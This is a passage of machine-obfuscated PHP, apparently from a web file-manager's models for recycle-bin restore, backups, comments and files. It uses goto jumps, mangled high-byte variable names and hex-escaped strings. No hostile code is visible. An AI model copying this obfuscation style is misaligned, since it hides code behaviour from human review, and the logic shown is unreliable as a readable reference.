array($Fˆ—ÛîšÈ[553] => $F†»“­¯ğ[$Fˆ—ÛîšÈ[407]], $Fˆ—ÛîšÈ[487] => $F†»“­¯ğ[$Fˆ—ÛîšÈ[487]]); $this->where(array($Fˆ—ÛîšÈ[399] => $B®Ñ‰Ï¤¿))->delete(); } goto dÎ†÷¡Áˆ§; cÌ‘ÃËÒãÅ: } public function restore($dõÎî¬ä†Û = false) { $a‰íæ¾Á = $this->listData(); $this->_restoreSource($a‰íæ¾Á, $dõÎî¬ä†Û); } public function restoreUserAll($DÕì «¨ƒ³) { $C¡Ô¥´½£ = $this->listData($DÕì «¨ƒ³); $this->_restoreSource($C¡Ô¥´½£, !1); } private function _restoreSource($eÌäÂ¶íèƒ, $bÀê‹“Òá…) { goto A“¦ïÑÍ„; Eƒ†İæÉÂ‘: if (!$eÌäÂ¶íèƒ) { return !0; } $FƒÀ²îÅæ = array(); foreach ($eÌäÂ¶íèƒ as $e¯«óÍŸé) { goto a²·ÓòÎš; BšƒÉ­Ş¯‚: $FƒÀ²îÅæ[] = $B§·ÄÃÇĞâ[$a°ßŸâ§Ü [481]]; if ($B§·ÄÃÇĞâ[$a°ßŸâ§Ü [406]] == $a°ßŸâ§Ü [96]) { $FƒÀ²îÅæ[] = $e¯«óÍŸé; } $cÎ‘ì†›ç¿->lockMoveEnd($e¯«óÍŸé); goto D·×•ÈÑ’È; F‡¬ÅÍ¸à: if ($dèÒäö¨…ˆ[$a°ßŸâ§Ü [426]] == $a°ßŸâ§Ü [96]) { continue; } $cÎ‘ì†›ç¿->lockMoveStart($e¯«óÍŸé); $this->recycleMove($e¯«óÍŸé, 0); goto eã±Š…ÓÇ‡; a²·ÓòÎš: if ($bÀê‹“Òá… != !1 && !in_array($e¯«óÍŸé, $bÀê‹“Òá…)) { continue; } $B§·ÄÃÇĞâ = $cÎ‘ì†›ç¿->sourceInfo($e¯«óÍŸé); $dèÒäö¨…ˆ = $cÎ‘ì†›ç¿->sourceInfo($B§·ÄÃÇĞâ[$a°ßŸâ§Ü [481]]); goto F‡¬ÅÍ¸à; eã±Š…ÓÇ‡: if ($B§·ÄÃÇĞâ[$a°ßŸâ§Ü [406]] == $a°ßŸâ§Ü [96]) { $DÆ˜Úõ²µ• = array($a°ßŸâ§Ü [557] => array($a°ßŸâ§Ü [516], $B§·ÄÃÇĞâ[$a°ßŸâ§Ü [490]] . $e¯«óÍŸé . $a°ßŸâ§Ü [517])); $cÎ‘ì†›ç¿->where($DÆ˜Úõ²µ•)->setField($a°ßŸâ§Ü [426], 0); $this->restoreFolderChildren($e¯«óÍŸé, $eÌäÂ¶íèƒ); } $this->where(array($a°ßŸâ§Ü [399] => $e¯«óÍŸé))->delete(); $cÎ‘ì†›ç¿->folderSizeReset($B§·ÄÃÇĞâ[$a°ßŸâ§Ü [481]]); goto BšƒÉ­Ş¯‚; D·×•ÈÑ’È: } goto a¤ñŒ“ÒŸŒ; A“¦ïÑÍ„: $a°ßŸâ§Ü  =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cÎ‘ì†›ç¿ = Model($a°ßŸâ§Ü [1164]); $bÀê‹“Òá… = $bÀê‹“Òá… == !1 ? !1 : $bÀê‹“Òá…; goto Eƒ†İæÉÂ‘; a¤ñŒ“ÒŸŒ: $cÎ‘ì†›ç¿->updateModifyTime($FƒÀ²îÅæ); goto bˆÒõİ™«è; bˆÒõİ™«è: } private function restoreFolderChildren($f¦»°Ş–µ, $DÓ¡ö°Â½) { goto cçİÒóĞš¤; cçİÒóĞš¤: $A¤§¡Æœƒ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $b¼‚îœˆ  = Model($A¤§¡Æœƒ[1164]); $BÙÈİºé¬· = array($A¤§¡Æœƒ[399] => array($A¤§¡Æœƒ[7], array())); goto cïè£ßÇ¨å; a‚¼ùá´¸: $BÙÈİºé¬·[$A¤§¡Æœƒ[399]][1] = array_unique($BÙÈİºé¬·[$A¤§¡Æœƒ[399]][1]); $BÙÈİºé¬·[$A¤§¡Æœƒ[918]] = $A¤§¡Æœƒ[1738]; $b¼‚îœˆ ->where($BÙÈİºé¬·)->setField($A¤§¡Æœƒ[426], 1); goto f‰Ü¸ ÅæÆ; cïè£ßÇ¨å: foreach ($DÓ¡ö°Â½ as $c±ø›–˜Ñ„) { if ($c±ø›–˜Ñ„ == $f¦»°Ş–µ) { continue; } if (!$b¼‚îœˆ ->isParentOf($f¦»°Ş–µ, $c±ø›–˜Ñ„)) { continue; } $Bš¦ğ­¶è = $b¼‚îœˆ ->sourceInfo($c±ø›–˜Ñ„); if ($Bš¦ğ­¶è[$A¤§¡Æœƒ[406]] == $A¤§¡Æœƒ[96]) { $BÙÈİºé¬·[] = array($A¤§¡Æœƒ[557] => array($A¤§¡Æœƒ[516], $Bš¦ğ­¶è[$A¤§¡Æœƒ[490]] . $c±ø›–˜Ñ„ . $A¤§¡Æœƒ[517])); } else { $BÙÈİºé¬·[$A¤§¡Æœƒ[399]][1][] = $c±ø›–˜Ñ„; } } if (!$BÙÈİºé¬·[$A¤§¡Æœƒ[399]][1]) { unset($BÙÈİºé¬·[$A¤§¡Æœƒ[399]]); } if (!$BÙÈİºé¬·) { return; } goto a‚¼ùá´¸; f‰Ü¸ ÅæÆ: } private function recycleMove($e©»¾±Á, $Dï¬àšË = 1) { $Bø¨Š˜‡Ë× =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bóµ™Õ²Ò‰ = Model($Bø¨Š˜‡Ë×[1164]); $D²ßŠÊ°¬° = Model($Bø¨Š˜‡Ë×[1947]); $E¸­ÊÌ¥ßã = array($Bø¨Š˜‡Ë×[399] => $e©»¾±Á); if ($Dï¬àšË) { $bóµ™Õ²Ò‰->where($E¸­ÊÌ¥ßã)->setField($Bø¨Š˜‡Ë×[426], 1); $D²ßŠÊ°¬°->eventRecycle($e©»¾±Á, $Bø¨Š˜‡Ë×[1948]); } else { $aøã®Á‘ = $bóµ™Õ²Ò‰->where($E¸­ÊÌ¥ßã)->find(); $bì©‡°¦´÷ = $aøã®Á‘[$Bø¨Š˜‡Ë×[406]] == $Bø¨Š˜‡Ë×[96]; $A»ì‰®–´Ğ = $bóµ™Õ²Ò‰->fileNameAuto($aøã®Á‘[$Bø¨Š˜‡Ë×[481]], $aøã®Á‘[$Bø¨Š˜‡Ë×[28]], REPEAT_RENAME_FOLDER, $bì©‡°¦´÷); if ($A»ì‰®–´Ğ != $aøã®Á‘[$Bø¨Š˜‡Ë×[28]]) { $bóµ™Õ²Ò‰->rename($e©»¾±Á, $A»ì‰®–´Ğ); } $bóµ™Õ²Ò‰->where($E¸­ÊÌ¥ßã)->setField($Bø¨Š˜‡Ë×[426], 0); $D²ßŠÊ°¬°->eventRecycle($e©»¾±Á, $Bø¨Š˜‡Ë×[1949]); } } } goto dãä¹ĞóÙ‡; aÇå“ÍƒƒŞ: class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\x62\x61\x63\x6b\165\160\x4c\151\x73\x74"; public $field = array("\x69\x6f", "\156\x61\155\x65", "\163\x74\141\x74\165\x73", "\x63\157\156\x74\145\156\164", "\162\145\163\165\x6c\164", "\x74\x69\155\x65\x46\x72\157\155", "\164\151\155\145\124\157"); public function config() { goto E‰Íò’µ“§; D¨İÜÒ×§¾: if (isset($FŒÖÓî¿‹®[$Cç£…çÂ¶[205]])) { $FŒÖÓî¿‹®[$Cç£…çÂ¶[205]] = json_decode($FŒÖÓî¿‹®[$Cç£…çÂ¶[205]], !0); } if (isset($EÈÈ¢Æ©Òµ[$Cç£…çÂ¶[205]])) { $FŒÖÓî¿‹®[$Cç£…çÂ¶[205]][$Cç£…çÂ¶[1461]] = $EÈÈ¢Æ©Òµ[$Cç£…çÂ¶[205]]; unset($EÈÈ¢Æ©Òµ[$Cç£…çÂ¶[205]]); } return array_merge($FŒÖÓî¿‹®, $EÈÈ¢Æ©Òµ); goto fŠ‰¢‰ê„À; dÍÏ˜æ×«¬: $EÈÈ¢Æ©Òµ = is_array($EÈÈ¢Æ©Òµ) ? $EÈÈ¢Æ©Òµ : array(); if (!isset($EÈÈ¢Æ©Òµ[$Cç£…çÂ¶[697]])) { $EÈÈ¢Æ©Òµ[$Cç£…çÂ¶[697]] = $Cç£…çÂ¶[96]; } $FŒÖÓî¿‹® = array(); goto C£»¯·ĞŠ·; E‰Íò’µ“§: $Cç£…çÂ¶ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EÈÈ¢Æ©Òµ = Model($Cç£…çÂ¶[1084])->get($Cç£…çÂ¶[718]); $EÈÈ¢Æ©Òµ = json_decode($EÈÈ¢Æ©Òµ, !0); goto dÍÏ˜æ×«¬; C£»¯·ĞŠ·: Action($Cç£…çÂ¶[1674])->taskInit(); $BÒ÷£…Ã¶Ş = Model($Cç£…çÂ¶[1675])->listData(); foreach ($BÒ÷£…Ã¶Ş as $e ÀøëÃ†) { if ($e ÀøëÃ†[$Cç£…çÂ¶[1129]] == $Cç£…çÂ¶[96] && $e ÀøëÃ†[$Cç£…çÂ¶[1476]] == $Cç£…çÂ¶[1676]) { $FŒÖÓî¿‹® = $e ÀøëÃ†; break; } } goto D¨İÜÒ×§¾; fŠ‰¢‰ê„À: } public function listData($cÔî†æ½Ç¼ = false, $d¿îõÔÂ–ƒ = "\x6d\x6f\x64\151\146\171\x54\151\x6d\x65", $CÑ½ëÆÀÄë = false) { return parent::listData($cÔî†æ½Ç¼, $d¿îõÔÂ–ƒ, !0); } public function lastItem() { $f›“ôùÉáî = $this->listData(); return !empty($f›“ôùÉáî[0]) ? $f›“ôùÉáî[0] : null; } public function kill($b¨™È´Şƒ™) { goto EğÇèè÷‘…; f®İöƒôÄÆ: return $this->remove($b¨™È´Şƒ™); goto D‰ìâ“©˜; EğÇèè÷‘…: $CƒéÈí—¾Ô =& $_SERVER[í¤âËÚ£¶íÊ¢]; $Eäµ½ºÚ£ƒ = $this->listData($b¨™È´Şƒ™); if (!$Eäµ½ºÚ£ƒ || empty($Eäµ½ºÚ£ƒ[$CƒéÈí—¾Ô[28]])) { return !0; } goto D–«¤ÇÖ­; D–«¤ÇÖ­: Task::kill($CƒéÈí—¾Ô[717]); Task::kill($CƒéÈí—¾Ô[736]); Task::kill($CƒéÈí—¾Ô[745]); goto CóÀÇ øÑè; CóÀÇ øÑè: $f®ñõøã–¹ = $Eäµ½ºÚ£ƒ[$CƒéÈí—¾Ô[28]]; $E‹èĞµÕâ  = TEMP_FILES . $CƒéÈí—¾Ô[714] . $f®ñõøã–¹ . $CƒéÈí—¾Ô[8]; IO::remove($E‹èĞµÕâ , !1); goto f®İöƒôÄÆ; D‰ìâ“©˜: } public function remove($C˜Ø¹¨ÃØ®) { $f‰‰‰¹à¼ = $this->listData($C˜Ø¹¨ÃØ®); if (!$f‰‰‰¹à¼) { return !0; } return $this->backupRemove($f‰‰‰¹à¼); } private function backupRemove($DÜèŠ¡Ñàø) { $dÌ´İ³õÉ’ =& $_SERVER[í¤âËÚ£¶íÊ¢]; parent::remove($DÜèŠ¡Ñàø[$dÌ´İ³õÉ’[397]]); $EÆ‘Íµ• = "\x7b\151\x6f\x3a{$DÜèŠ¡Ñàø[$dÌ´İ³õÉ’[696]]}\x7d\x2f\144\141\x74\x61\x62\x61\163\145\x2f\142\141\143\x6b\x75\160\137" . $DÜèŠ¡Ñàø[$dÌ´İ³õÉ’[28]]; IO::remove($EÆ‘Íµ•, !1); return !0; } public function start() { goto c´õ…øÚØ; Dğš«¯°ôÍ: if (!$dÁ®µ²ôË‡ || $dÁ®µ²ôË‡[$Fääˆã¸¹[1458]] != $Fääˆã¸¹[96]) { return !1; } $Fä«·Ğ½Šö = $this->process(); foreach ($Fä«·Ğ½Šö as $CÉßˆëÀ’) { if ($CÉßˆëÀ’) { return Task::restart($CÉßˆëÀ’[$Fääˆã¸¹[397]]); } } goto cä¢Æ¦Ïê; c´õ…øÚØ: $Fääˆã¸¹ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($GLOBALS[$Fääˆã¸¹[6]][$Fääˆã¸¹[97]][$Fääˆã¸¹[1677]] != $Fääˆã¸¹[96]) { return !0; } $dÁ®µ²ôË‡ = $this->config(); goto Dğš«¯°ôÍ; c¢í¿­‹·: if ($cêÁæÈïÔ) { $cêÁæÈïÔ = $Açõê¤º­Â->dbFile(); if ($cêÁæÈïÔ && $dÁ®µ²ôË‡[$Fääˆã¸¹[697]] == $Fääˆã¸¹[500]) { $cêÁæÈïÔ = $Açõê¤º­Â->file(); } } Backup::set(array($Fääˆã¸¹[694] => 1, $Fääˆã¸¹[479] => time())); return !0; goto F ÙÀ¬ÏÊ; cä¢Æ¦Ïê: $Açõê¤º­Â = new Backup(); $Açõê¤º­Â->keep(); $cêÁæÈïÔ = $Açõê¤º­Â->db(); goto c¢í¿­‹·; F ÙÀ¬ÏÊ: } public function process() { $b¤¬§±Ûøµ =& $_SERVER[í¤âËÚ£¶íÊ¢]; return array($b¤¬§±Ûøµ[699] => Task::get($b¤¬§±Ûøµ[717]), $b¤¬§±Ûøµ[702] => Task::get($b¤¬§±Ûøµ[736]), $b¤¬§±Ûøµ[201] => Task::get($b¤¬§±Ûøµ[745])); } public function restore() { $EšÅº£œ·Ç =& $_SERVER[í¤âËÚ£¶íÊ¢]; ActionCall($EšÅº£œ·Ç[979], !0, 1); ActionCall($EšÅº£œ·Ç[979], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\155\155\145\x6e\164"; protected $tableMeta = array("\164\141\142\154\x65\116\x61\x6d\x65" => "\143\157\155\155\x65\156\x74\137\155\145\x74\141", "\x6d\x65\x74\x61\106\x69\145\154\144" => "\x63\x6f\155\x6d\x65\x6e\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($BÛˆÈ½­ÉŒ) { $F‘ÇÎ„¤Ş =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($BÛˆÈ½­ÉŒ[$F‘ÇÎ„¤Ş[1678]]) { $e³÷À¼ŸÌ» = $this->where(array($F‘ÇÎ„¤Ş[1679] => $BÛˆÈ½­ÉŒ[$F‘ÇÎ„¤Ş[1678]]))->find(); if (!$e³÷À¼ŸÌ» || $e³÷À¼ŸÌ»[$F‘ÇÎ„¤Ş[407]] != $BÛˆÈ½­ÉŒ[$F‘ÇÎ„¤Ş[407]] || $e³÷À¼ŸÌ»[$F‘ÇÎ„¤Ş[487]] != $BÛˆÈ½­ÉŒ[$F‘ÇÎ„¤Ş[487]]) { return !1; } $this->where(array($F‘ÇÎ„¤Ş[1679] => $BÛˆÈ½­ÉŒ[$F‘ÇÎ„¤Ş[1678]]))->setAdd($F‘ÇÎ„¤Ş[1680], 1); } $BÛˆÈ½­ÉŒ[$F‘ÇÎ„¤Ş[1681]] = 0; $BÛˆÈ½­ÉŒ[$F‘ÇÎ„¤Ş[1680]] = 0; $BÛˆÈ½­ÉŒ[$F‘ÇÎ„¤Ş[694]] = 1; return $this->add($BÛˆÈ½­ÉŒ); } public function commentCount($fï«¸Å†¾³, $FØ™ƒšË¼ƒ) { goto E‚áê˜å–ô; E‚áê˜å–ô: $bö–Æ¼„‰ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$fï«¸Å†¾³) { return array(); } if (is_string($fï«¸Å†¾³) || is_int($fï«¸Å†¾³)) { $fï«¸Å†¾³ = array($fï«¸Å†¾³); } goto Fì†õ•„; Fì†õ•„: $Fä¼ƒÆùğ» = array($bö–Æ¼„‰[487], $bö–Æ¼„‰[1682] => $bö–Æ¼„‰[483]); $cäÊ¥Ş»½® = array($bö–Æ¼„‰[487] => array($bö–Æ¼„‰[7], $fï«¸Å†¾³), $bö–Æ¼„‰[407] => $FØ™ƒšË¼ƒ); $eéÒé‹Ï¦— = $this->field($Fä¼ƒÆùğ»)->where($cäÊ¥Ş»½®)->group($bö–Æ¼„‰[487])->select(); goto a¥Ú¾¥‹‘Ë; a¥Ú¾¥‹‘Ë: return array_to_keyvalue($eéÒé‹Ï¦—, $bö–Æ¼„‰[487], $bö–Æ¼„‰[483]); goto BÏàò´Ää; BÏàò´Ää: } public function remove($f±‚—Ò¥©Ù) { $dÃÇôğ¬¡¢ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $F½„éÈÇãŠ = array($dÃÇôğ¬¡¢[1679] => $f±‚—Ò¥©Ù); $B„–ç©¦ = $this->where($F½„éÈÇãŠ)->find(); if ($B„–ç©¦[$dÃÇôğ¬¡¢[1678]]) { $this->where(array($dÃÇôğ¬¡¢[1679] => $B„–ç©¦[$dÃÇôğ¬¡¢[1678]]))->setAdd($dÃÇôğ¬¡¢[1680], -1); } return $this->where($F½„éÈÇãŠ)->delete(); } public function edit($bÙÄŞ»Š—†, $f‹òÂÕ†ÖÛ) { $a„„ŒØÇå =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CÓö¼ƒ†µÌ = array($a„„ŒØÇå[1679] => $bÙÄŞ»Š—†); return $this->where($CÓö¼ƒ†µÌ)->save(array($a„„ŒØÇå[1683] => $f‹òÂÕ†ÖÛ)); } public function prasise($FÔèÕˆïÀº) { $c¯Éã‘˜˜Ú =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D”¡«íÆ¶· = Model($c¯Éã‘˜˜Ú[1684]); $fÒ¦›îÍƒ = array($c¯Éã‘˜˜Ú[1679] => $FÔèÕˆïÀº, $c¯Éã‘˜˜Ú[1479] => USER_ID); $A­Ø¡—«¹ = $D”¡«íÆ¶·->where($fÒ¦›îÍƒ)->find(); if (!$A­Ø¡—«¹) { $D”¡«íÆ¶·->add($fÒ¦›îÍƒ); $d¨é¶Ó = $this->where(array($c¯Éã‘˜˜Ú[1679] => $FÔèÕˆïÀº))->setAdd($c¯Éã‘˜˜Ú[1681], 1); } else { $D”¡«íÆ¶·->where($fÒ¦›îÍƒ)->delete(); $d¨é¶Ó = $this->where(array($c¯Éã‘˜˜Ú[1679] => $FÔèÕˆïÀº))->setAdd($c¯Éã‘˜˜Ú[1681], -1); } return $d¨é¶Ó; } public function targetInfo($A¢ëÂï‘œ¼, $F¢Ê‰âè›Œ) { goto b‘˜«ç‘; A¸©Ó‡¿ğÁ: return $C¼Ùäåôë; goto A”ˆ£ÂÂ¿; f²ìï¼®°³: $E’ø¦ÏÙ› = "\x52\x49\x47\110\124\x20\112\117\x49\116\x20{$this->tablePrefix}\143\x6f\155\x6d\x65\x6e\164\x5f\160\162\x61\x69\163\x65\x20\163\x74\141\162\x20\157\x6e\40\x63\157\155\155\145\156\x74\56\x63\157\155\155\x65\156\164\x49\x44\40\75\40\x73\164\x61\x72\x2e\x63\157\155\x6d\x65\x6e\164\x49\x44"; $CÂª×¹ñÃ‹ = $this->alias($fÆŒÀò¸êÄ[359])->where($d»¦Æ‚²ÛÁ)->join($E’ø¦ÏÙ›, $fÆŒÀò¸êÄ[1685])->count(); $C¼Ùäåôë = array($fÆŒÀò¸êÄ[1686] => $D¾±ï¥ö–, $fÆŒÀò¸êÄ[1687] => $CÂª×¹ñÃ‹); goto A¸©Ó‡¿ğÁ; b‘˜«ç‘: $fÆŒÀò¸êÄ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $d»¦Æ‚²ÛÁ = array($fÆŒÀò¸êÄ[553] => $A¢ëÂï‘œ¼, $fÆŒÀò¸êÄ[554] => $F¢Ê‰âè›Œ); $D¾±ï¥ö– = $this->where($d»¦Æ‚²ÛÁ)->count(); goto f²ìï¼®°³; A”ˆ£ÂÂ¿: } public function listData($B‰¤‹Ú‘) { $f¸ãÔ§±Ûù =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (isset($B‰¤‹Ú‘[$f¸ãÔ§±Ûù[1688]])) { if ($B‰¤‹Ú‘[$f¸ãÔ§±Ûù[1688]]) { $B‰¤‹Ú‘[$f¸ãÔ§±Ûù[1689]] = array($f¸ãÔ§±Ûù[932], intval($B‰¤‹Ú‘[$f¸ãÔ§±Ûù[1688]])); } unset($B‰¤‹Ú‘[$f¸ãÔ§±Ûù[1688]]); } if (isset($B‰¤‹Ú‘[$f¸ãÔ§±Ûù[1690]])) { if ($B‰¤‹Ú‘[$f¸ãÔ§±Ûù[1690]]) { $B‰¤‹Ú‘[$f¸ãÔ§±Ûù[1689]] = array($f¸ãÔ§±Ûù[929], intval($B‰¤‹Ú‘[$f¸ãÔ§±Ûù[1690]])); } unset($B‰¤‹Ú‘[$f¸ãÔ§±Ûù[1690]]); } return $this->_listData($B‰¤‹Ú‘); } private function _listData($dÛ…ƒŠ‰ÈÎ) { $Eíßäá ê =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E´§ÎŒ›‰Œ = $this->where($dÛ…ƒŠ‰ÈÎ)->_makeOrder()->selectPage(100); $this->_listAppendParent($E´§ÎŒ›‰Œ[$Eíßäá ê[375]]); $this->_listAppendUser($E´§ÎŒ›‰Œ[$Eíßäá ê[375]]); $this->_listAppendMeta($E´§ÎŒ›‰Œ[$Eíßäá ê[375]]); return $E´§ÎŒ›‰Œ; } private function _makeOrder() { $bòÁÄØ•²ß =& $_SERVER[í¤âËÚ£¶íÊ¢]; $DÕ÷¯ù™á¤ = array($bòÁÄØ•²ß[1681], $bòÁÄØ•²ß[1680], $bòÁÄØ•²ß[202]); $bµó‘Û×½Ì = Input::get($bòÁÄØ•²ß[438], $bòÁÄØ•²ß[7], $bòÁÄØ•²ß[419], $DÕ÷¯ù™á¤); $AèÉÖ¿Îƒ· = Input::get($bòÁÄØ•²ß[439], $bòÁÄØ•²ß[7], $bòÁÄØ•²ß[1481], array($bòÁÄØ•²ß[1691], $bòÁÄØ•²ß[434])); $Fà†“³³ÖÂ = $bµó‘Û×½Ì . $bòÁÄØ•²ß[50] . $AèÉÖ¿Îƒ·; return $this->order($Fà†“³³ÖÂ); } private function _listAppendParent(&$dÏ¼¦¤²·) { goto eå¤¼…Â†; cäÕÚ ²ĞÔ: if (!$E“ò™¡­¢Ş) { return; } $bù…Ã«¨’ = $this->where(array($Fæ‰óğµÓä[1679] => array($Fæ‰óğµÓä[7], $E“ò™¡­¢Ş)))->select(); $bù…Ã«¨’ = array_to_keyvalue($bù…Ã«¨’, $Fæ‰óğµÓä[1689]); goto eÜ×™Œ¯¯£; eå¤¼…Â†: $Fæ‰óğµÓä =& $_SERVER[í¤âËÚ£¶íÊ¢]; $E“ò™¡­¢Ş = array_unique(array_to_keyvalue($dÏ¼¦¤²·, $Fæ‰óğµÓä[33], $Fæ‰óğµÓä[1678])); $E“ò™¡­¢Ş = array_remove_value($E“ò™¡­¢Ş, $Fæ‰óğµÓä[500]); goto cäÕÚ ²ĞÔ; eÜ×™Œ¯¯£: foreach ($dÏ¼¦¤²· as &$EïÑĞŸÊ) { if (isset($bù…Ã«¨’[$EïÑĞŸÊ[$Fæ‰óğµÓä[1678]]])) { $EïÑĞŸÊ[$Fæ‰óğµÓä[1692]] = $bù…Ã«¨’[$EïÑĞŸÊ[$Fæ‰óğµÓä[1678]]]; } } unset($EïÑĞŸÊ); goto bìå…»Ğ; bìå…»Ğ: } private function _listAppendUser(&$c–ßí¥©›´) { goto b¹²³ƒÓß†; b¹²³ƒÓß†: $Aª»ƒâç²¥ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eàƒÄ­“ù• = array_unique(array_to_keyvalue($c–ßí¥©›´, $Aª»ƒâç²¥[33], $Aª»ƒâç²¥[1487])); $eàƒÄ­“ù• = array_remove_value($eàƒÄ­“ù•, $Aª»ƒâç²¥[500]); goto A†éø™ôµĞ; fˆ¹õ¹É: foreach ($c–ßí¥©›´ as &$CÈ’‹ÅÓÀ¥) { $CÈ’‹ÅÓÀ¥[$Aª»ƒâç²¥[566]] = $DÀöµˆõê“[$CÈ’‹ÅÓÀ¥[$Aª»ƒâç²¥[1487]]]; if (isset($CÈ’‹ÅÓÀ¥[$Aª»ƒâç²¥[1692]])) { $CÈ’‹ÅÓÀ¥[$Aª»ƒâç²¥[1692]][$Aª»ƒâç²¥[566]] = $DÀöµˆõê“[$CÈ’‹ÅÓÀ¥[$Aª»ƒâç²¥[1692]][$Aª»ƒâç²¥[1487]]]; } } unset($CÈ’‹ÅÓÀ¥); goto d„Œ¾ÏŒ¢; A†éø™ôµĞ: if (count($eàƒÄ­“ù•) == 0) { return; } foreach ($c–ßí¥©›´ as $CÈ’‹ÅÓÀ¥) { if (isset($CÈ’‹ÅÓÀ¥[$Aª»ƒâç²¥[1692]])) { $eàƒÄ­“ù•[] = $CÈ’‹ÅÓÀ¥[$Aª»ƒâç²¥[1692]][$Aª»ƒâç²¥[1487]]; } } $DÀöµˆõê“ = Model($Aª»ƒâç²¥[510])->userListInfo($eàƒÄ­“ù•); goto fˆ¹õ¹É; d„Œ¾ÏŒ¢: } private function _listAppendMeta(&$A¼ã õ°É‚) { goto B¦ù‹Ç©Ğš; B¦ù‹Ç©Ğš: $BµÖŒÌĞ’† =& $_SERVER[í¤âËÚ£¶íÊ¢]; $d¿ùğ‡ŸÕ™ = array_unique(array_to_keyvalue($A¼ã õ°É‚, $BµÖŒÌĞ’†[33], $BµÖŒÌĞ’†[1689])); $d¿ùğ‡ŸÕ™ = array_remove_value($d¿ùğ‡ŸÕ™, $BµÖŒÌĞ’†[500]); goto BÑßÔ·î‰â; BÑßÔ·î‰â: if (!$d¿ùğ‡ŸÕ™) { return; } foreach ($A¼ã õ°É‚ as $a¥—“©º¯) { if (isset($a¥—“©º¯[$BµÖŒÌĞ’†[1692]])) { $d¿ùğ‡ŸÕ™[] = $a¥—“©º¯[$BµÖŒÌĞ’†[1692]][$BµÖŒÌĞ’†[1689]]; } } $F­ôŒ¤é”Ì = $this->metaList($d¿ùğ‡ŸÕ™); goto A³ÍêŠ×“à; A³ÍêŠ×“à: if (!$F­ôŒ¤é”Ì) { return !1; } foreach ($A¼ã õ°É‚ as &$a¥—“©º¯) { $a¥—“©º¯[$BµÖŒÌĞ’†[448]] = $F­ôŒ¤é”Ì[$a¥—“©º¯[$BµÖŒÌĞ’†[1689]]]; if (isset($a¥—“©º¯[$BµÖŒÌĞ’†[1692]])) { $a¥—“©º¯[$BµÖŒÌĞ’†[1692]][$BµÖŒÌĞ’†[448]] = $F­ôŒ¤é”Ì[$a¥—“©º¯[$BµÖŒÌĞ’†[1692]][$BµÖŒÌĞ’†[1689]]]; } } unset($a¥—“©º¯); goto CÃï¼Ûò•…; CÃï¼Ûò•…: } private function metaList($aÛ©°Å·óÆ) { goto fùÀªÕ¦İ§; f­‚ÂÀÅŞà: return $fÏçîëÚ·¬ ? $fÏçîëÚ·¬ : array(); goto d¬Ş³ã Ó; c‹°¡óï¨À: $fÏçîëÚ·¬ = Model($dùß´ï´[1693])->where($båÖåÉî·á)->select(); $fÏçîëÚ·¬ = array_to_keyvalue_group($fÏçîëÚ·¬, $dùß´ï´[1689]); foreach ($fÏçîëÚ·¬ as $D÷°ïíœù‰ => $B´Š¸¢ ›) { $FáÒöËù²´ = array(); foreach ($B´Š¸¢ › as $a ¥£ÒÈˆ) { $FáÒöËù²´[$a ¥£ÒÈˆ[$dùß´ï´[102]]] = $a ¥£ÒÈˆ[$dùß´ï´[380]]; } $fÏçîëÚ·¬[$D÷°ïíœù‰] = $FáÒöËù²´; } goto f­‚ÂÀÅŞà; fùÀªÕ¦İ§: $dùß´ï´ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$aÛ©°Å·óÆ) { return array(); } $båÖåÉî·á = array($dùß´ï´[1689] => array($dùß´ï´[7], $aÛ©°Å·óÆ)); goto c‹°¡óï¨À; d¬Ş³ã Ó: } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\146\151\x6c\x65\137\x63\x6f\156\164\x65\156\x74\x73"; protected $dataAuto = array(array("\143\x72\145\141\x74\x65\x54\151\155\145", "\x74\151\155\x65", "\x69\x6e\163\x65\x72\164", "\146\x75\156\143\164\151\157\x6e")); } goto e½—•ê²ìÏ; e½—•ê²ìÏ: class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x66\151\x6c\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\145\x4e\141\155\x65" => "\x69\x6f\x5f\146\x69\x6c\145\137\155\x65\164\141", "\155\145\x74\x61\x46\151\x65\154\x64" => "\146\151\154\145\111\104"); public function fileInfo($EÆ”š¾¨„Ñ) { $e©£ŞÌÑÃÛ =& $_SERVER[í¤âËÚ£¶íÊ¢]; static $dîáÊİá±› = array(); if (!isset($dîáÊİá±›[$EÆ”š¾¨„Ñ])) { $dª›ªâñ™ = $e©£ŞÌÑÃÛ[1694]; $fÃ’›¡áª’ = Model($e©£ŞÌÑÃÛ[453])->field($dª›ªâñ™)->where(array($e©£ŞÌÑÃÛ[451] => $EÆ”š¾¨„Ñ))->find(); $dîáÊİá±›[$EÆ”š¾¨„Ñ] = $fÃ’›¡áª’; } return $dîáÊİá±›[$EÆ”š¾¨„Ñ]; } public function addFileByContent($FˆÏ¢¸Å½­ = '', $dİ¡ñ¸×®Ú = '') { goto Eš­—õİîÕ; FéÔï‚«†Å: if (file_exists($AŒöñİÜñÑ)) { @unlink($AŒöñİÜñÑ); } return $DÂÖ˜õñë; goto c×œàÈà«Ì; aŸã¥£¨¼‡: $AŒöñİÜñÑ = $dù½«ó¹®´ . $bæ¤‘¹…â[1696] . rand_string(16); file_put_contents($AŒöñİÜñÑ, $FˆÏ¢¸Å½­); $DÂÖ˜õñë = $this->addFile($AŒöñİÜñÑ, $dİ¡ñ¸×®Ú, !0); goto FéÔï‚«†Å; 